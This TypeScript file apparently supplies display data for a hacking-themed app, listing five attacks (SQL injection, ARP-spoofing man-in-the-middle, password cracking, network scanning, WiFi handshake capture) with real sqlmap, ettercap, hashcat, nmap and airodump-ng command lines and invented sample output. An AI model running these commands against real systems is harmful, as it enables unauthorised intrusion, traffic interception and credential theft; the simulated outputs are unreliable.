import { Attack } from '../types/Attack';

export const attacks: Attack[] = [
  {
    name: "SQL Injection",
    description: "Exploits SQL database vulnerabilities by injecting malicious SQL code. Common in web applications with poor input validation.",
    command: "sqlmap -u \"http://target.com/page.php?id=1\" --dbs --batch --random-agent",
    output: "[*] starting automatic SQL injection\n[+] using random User-Agent\n[+] databases found:\n- admin\n- users\n- products\n[*] stored results in ~/.sqlmap/output/results-01.txt",
    icon: "database"
  },
  {
    name: "Man in the Middle",
    description: "Intercepts communication between two systems. Uses ARP spoofing to redirect traffic through the attacker's machine.",
    command: "ettercap -T -S -i eth0 -M arp:remote /target-ip/ /gateway-ip/",
    output: "[*] Starting Ettercap...\n[+] Scanning for hosts...\n[+] ARP poisoning victims:\n    TARGET: 192.168.1.10\n    ROUTER: 192.168.1.1\n[+] SSL stripping enabled\n[*] Intercepting traffic...",
    icon: "network"
  },
  {
    name: "Password Cracking",
    description: "Attempts to decrypt password hashes using wordlists and rules. Supports multiple hash types and GPU acceleration.",
    command: "hashcat -m 0 -a 0 -w 3 --force hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
    output: "[*] Starting hash cracking with GPU acceleration\n[+] Loaded 15 password hashes\n[+] Rule: best64.rule\n[*] Progress: 45%\n[+] Hash found: admin:password123!\n[+] Hash found: user:qwerty123\n[*] Time.Started.....: Sun Mar 10 15:42:31 2024",
    icon: "key"
  },
  {
    name: "Network Scanning",
    description: "Advanced network reconnaissance using Nmap. Detects services, OS versions, and potential vulnerabilities.",
    command: "nmap -sV -sC -O --script vuln -p- --min-rate 5000 target-ip",
    output: "Starting Nmap 7.94 ( https://nmap.org )\nPORT     STATE  SERVICE  VERSION\n22/tcp   open   ssh      OpenSSH 8.2p1\n80/tcp   open   http     nginx 1.18.0\n443/tcp  open   https    Apache\n3306/tcp open   mysql    MySQL 8.0.28\n|_http-vuln-cve2021-44228: Apache log4j RCE vulnerability\nOS detection performed",
    icon: "scan"
  },
  {
    name: "Wireless Attack",
    description: "Advanced WiFi network auditing. Captures handshakes, performs deauth attacks, and cracks WPA/WPA2.",
    command: "airmon-ng start wlan0 && airodump-ng -c 1 --bssid TARGET_BSSID -w capture wlan0mon",
    output: "[*] Enabling monitor mode on wlan0\n[+] Interface wlan0mon created\n BSSID              PWR  Beacons    Data  CH   MB   ENC  CIPHER AUTH  ESSID\n AA:BB:CC:DD:EE:FF  -50  2459      452   1   130  WPA2 CCMP   PSK   Target_Network\n[+] WPA handshake: AA:BB:CC:DD:EE:FF\n[*] Saving capture to: capture.cap",
    icon: "wifi"
  }
];